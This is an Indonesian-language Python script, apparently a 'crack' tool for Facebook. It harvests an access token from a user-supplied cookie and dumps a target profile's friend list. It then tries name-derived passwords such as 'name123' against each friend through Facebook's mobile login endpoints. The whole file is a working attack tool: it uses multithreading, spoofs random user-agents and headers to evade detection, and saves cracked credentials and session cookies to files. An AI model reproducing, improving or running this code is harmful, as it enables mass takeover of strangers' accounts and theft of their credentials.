#!/usr/bin/python3
#coding=utf-8

# tampung module
import os,sys,time,datetime
import json,requests,random,re
import bs4,base64,urllib3
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as tred

# warna
M = '\x1b[0;31m'
H = '\x1b[0;32m'
K = '\x1b[0;33m'
B = '\x1b[0;34m'
U = '\x1b[0;35m'
O = '\x1b[0;36m'
P = '\x1b[0;97m'

# data bulan & tahun
url_mb = "mbasic.facebook.com"
url_bs = "business.facebook.com"
hitung = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
hitung2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tanggal = datetime.datetime.now().day
bulan = hitung[(str(datetime.datetime.now().month))]
tahun = datetime.datetime.now().year
okeh = f"OK-{str(tanggal)}-{str(bulan)}-{str(tahun)}.txt"
cepe = f"CP-{str(tanggal)}-{str(bulan)}-{str(tahun)}.txt"
toket, loop, ok, cp = [],0,0,0

# logo - lo goblok
def banner():
	print(f"{P} _____  ___  ____\n|____  |    |____\n_____| |___ |")
	
# atur code
def jalan(__becek__):
	for __meki__ in __becek__ + "\n":
		sys.stdout.write(__meki__)
		sys.stdout.flush()
		time.sleep(0.03)
def sapu():
	os.system("clear")

# identifikasi cookie
def cek_cookie():
	try:
		token = open('.toket.txt','r').read();cok = open('.kueh.txt','r').read();toket.append(token)
		try:get_url = requests.get('https://graph.facebook.com/me?fields=id,name,birthday,email&access_token='+toket[0],cookies={'cookie':cok});__nama__ = json.loads(get_url.text)['name'];menu(__nama__)
		except KeyError:login_tools()
		except requests.exceptions.ConnectionError:
			exit(f"{P}!. Tidak ada koneksi")
	except IOError:
		login_tools()

# login cookie facebook
def login_tools():
	sapu();banner()
	cookie = input(f"\n{P}?. Masukan cookie : {H}")
	try:
		ling_oleng = requests.get("https://"+url_bs+"/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": url_bs,"origin": "https://"+url_bs,"upgrade-insecure-requests" : "1","accept-language": "fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)",ling_oleng.text);tok = open(".toket.txt", "w").write(find_token.group(1));cok = open(".kueh.txt", "w").write(cookie)
		bakso = open('.toket.txt','r').read();time.sleep(1)
		print(f"\n{P}!. Token kamu : {H}{bakso}{P}");time.sleep(3)
		cek_cookie()
	except Exception as e:
		os.system("rm -f .toket.txt");os.system("rm -f .kueh.txt")
		jalan(f"{P}!. Login gagal ...")
		time.sleep(1);exit()
		
# pilihan menu
def menu(__nama__):
	try:token = open('.toket.txt','r').read();cok = open('.kueh.txt','r').read()
	except (KeyError,IOError):
		jalan("{P}!. Cookie invalid ...");time.sleep(2)
		login_tools()
	sapu();banner()
	ipku = requests.get("https://api.ipify.org").text
	print(f"""{P}
-> Dev  : {H}Aang XD{P}
-> Fb   : {H}Aang.Qwerty69{P}
=========================
-> Nama : {H}{str(__nama__)}{P}
-> Ip   : {H}{ipku}{P}

1. Crack id publik
2. Keluar ({M}hapus cookie{P})
""")
	__core__ = input(f"{P}?. Pilih : ")
	if __core__ in ["01","1"]:__ngentod__().dump_user()
	elif __core__ in ["00","0"]:
		os.system('rm -rf .toket.txt');os.system('rm -rf .kueh.txt')
		exit(f"\n{P}√. Berhasil terhapus ...")
		
class __ngentod__:
	
	
	def __init__(self):
		self.id, self.user = [],[]
		self.res, self.log = [],[]
		self.manual, self.otomatis = [],[]
		
	def dump_user(self):
		try:token = open('.toket.txt','r').read();cok = open('.kueh.txt','r').read()
		except IOError:exit()
		__midlane__ = input(f"\n{P}?. Id publik : ")
		self.user.append(__midlane__)
		for __colmek__ in self.user:
			try:
				session = requests.Session()
				get_id = session.get(f'https://graph.facebook.com/v15.0/{__colmek__}?fields=name,friends.limit(5000)&access_token='+toket[0], cookies = {'cookies':cok}).json()
				peler = get_id["name"]
				for xyz in get_id['friends']['data']:
					try:
						__data__ = (xyz['id']+'|'+xyz['name'])
						if __data__ in self.id:pass
						else:self.id.append(__data__)
					except:continue
			except (KeyError,IOError):exit(f"{P}!. Id private/tidak memiliki teman")
			try:
				print(f"{P}√. Target name : {H}{peler}{P}")
				print(f"{P}√. Jumlah {H}{str(len(self.id))}{P} id")
				self.__password__()
			except requests.exceptions.ConnectionError:
				exit(f"{P}!. Tidak ada koneksi")
		
		
	def __password__(self):
		__pas__ = input(f"\n{P}?. Password manual y/t : ")
		if __pas__ in ["Y","y"]:
			self.manual.append('ya')
			print(f"\n{P}!. Gunakan {H}koma{P} sebagai pemisah")
			pasw = input(f"{P}?. Password : {H}")
			tambah = pasw.split(',')
			for __ytta__ in tambah:
				self.otomatis.append(__ytta__)
		print(f"\n{P}1. Log mbasic (slow)\n2. Log mobile (very slow)")
		__mid__ = input(f"\n{P}?. Input : ")
		if __mid__ in ["01","1"]:self.log.append("mbasic")
		elif __mid__ in ["02","2"]:self.log.append("mobile")
		self.list_pw()
		
		
	def list_pw(self):
		print(f"\n{P}!. {H}{okeh}{P}\n!. {K}{cepe}{P}\n")
		with tred(max_workers=20) as __rampung__:
			for AangXD in self.id:
				usr,__cans__ = AangXD.split('|')[0],AangXD.split('|')[1].lower()
				__kiya__ = __cans__.split(' ')[0]
				ang = []
				if len(__cans__)<6:
					if len(__kiya__)<3:
						pass
					else:
						ang.append(__kiya__+'123');ang.append(__kiya__+'1234');ang.append(__kiya__+'321')
				else:
					if len(__kiya__)<3:ang.append(__cans__)
					else:
						ang.append(__cans__);ang.append(__kiya__+'123')
						ang.append(__kiya__+'1234');ang.append(__kiya__+'321')
				if 'ya' in self.manual:
					for __yntkts__ in self.otomatis:
						ang.append(__yntkts__) # yo ndak tau kok tanya saia :v
				else:pass
				if 'mbasic' in self.log:__rampung__.submit(self.__crack__,usr,ang,'mbasic.facebook.com')
				elif 'mobile' in self.log:__rampung__.submit(self.__crack__,usr,ang,'m.facebook.com')
				else:__rampung__.submit(self.__crack__,usr,ang,'m.facebook.com')
		print(f"\n\n{P}!> Jumlah ok : {H}{ok}{P}\n!> Jumlah cp : {K}{cp}{P}")
		
		
	def __crack__(self, usr, ang, url):
		global loop, ok, cp
		az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
		rr = random.randint
		rc = random.choice
		ugen = f"Mozilla/5.0 (Linux; Android {str(rr(10,13))}; Redmi Note 9 Pro Max Build/QKQ1.{str(rr(111111,999999))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Safari/537.36"
		for pw in ang:
			try:
				session = requests.Session()
				get = session.get(f"https://{url}/login/?email={usr}&pass={pw}&locale2=id_ID")
				date = {
						"lsd":re.search('name="lsd" value="(.*?)"',str(get.text)).group(1),
						"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
						"m_ts":re.search('name="m_ts" value="(.*?)"',str(get.text)).group(1),
						"li":re.search('name="li" value="(.*?)"',str(get.text)).group(1),
						"email":usr,"pass":pw,"Host":"https://"+url+"/login/save-device/?login=source_login&ref=wizard"
					}
				respons = (
					{
						'Host': f'{url}',
						'accept': 'image/webp,image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5',
						'accept-encoding': 'gzip,deflate',
						'accept-language': 'es_LA,id;q=0.9',
						'content-length': f'{str(rr(1111,9999))}',
						'content-type': 'application/x-www-form-urlencoded',
						'origin': 'https://'+url,
						'referer': f'https://{url}/reg/?cid=103&refid=8',
						'user-agent': ugen,
						'sec-fetch-dest': f'{random.choice(["empty","document"])}',
						'sec-fetch-mode': f'{random.choice(["navigate","cors"])}',
						'sec-fetch-site': f'{random.choice(["none","same-origin"])}',
						'sec-fetch-user': f'{random.choice(["?1","empty"])}',
						'x-requested-with': 'www.facebook.com',
						'x-xss-protection': '0',
						'sec-ch-ua': '" Not A;Brand";v="99", "Microsoft Edge";v="101", "Chromium";v="101"',
						'sec-ch-ua-mobile': '?0'
					}
				)
				yz = session.post(f'https://{url}/login/device-based/login/async/?refsrc=wizard', headers=respons, data=date, allow_redirects=False)
				if "checkpoint" in session.cookies.get_dict().keys():
					print(f"\r>> {K}{usr}|{pw}{P}                   ")
					open('CP/'+cepe,'a').write(usr+'|'+pw+'\n')
					self.res.append(usr+'|'+pw)
					cp+=1
					break
				elif "c_user" in session.cookies.get_dict().keys():
						kukis = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print(f"\r>> {H}{usr}|{pw}|{kukis}{P}")
						open('CP/'+okeh,'a').write(usr+'|'+pw+'\n')
						self.res.append(usr+'|'+pw)
						ok+=1
						break
				else:
					continue
			except requests.exceptions.ConnectionError:time.sleep(30)
		loop+=1
		Q = random.choice([P,H,M,K,U,B,O])
		print(f"\r{P}%s/%s {Q}{usr}{P} {H}%s{P}/{K}%s{P} "%(loop,len(self.id),ok,cp),end=" ");sys.stdout.flush()


if __name__=='__main__':
	cek_cookie()